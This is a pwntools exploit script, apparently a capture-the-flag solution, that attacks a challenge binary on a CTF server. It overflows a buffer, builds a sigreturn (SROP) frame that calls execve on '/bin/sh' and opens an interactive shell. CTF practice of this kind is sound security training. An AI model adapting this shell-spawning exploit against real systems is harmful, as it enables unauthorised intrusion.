#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./minimal_bar')
#libc = ELF('./libc.so.6')
#rop = ROP(exe)

host, port = "hctf.hackappatoi.com", "10004"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 59
frame.rdi = 0x404000
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x404000
frame.rip = 0x40109a
frame = bytes(frame)

payload = 'A'*8+p64(0x404008)+p64(0x40102c)+p64(0x404008)+p64(0x40109a)+frame
sa('> ', payload)
payload2 = '/bin/sh\x00'+'A'*7
sa('>', payload2)
p.interactive()

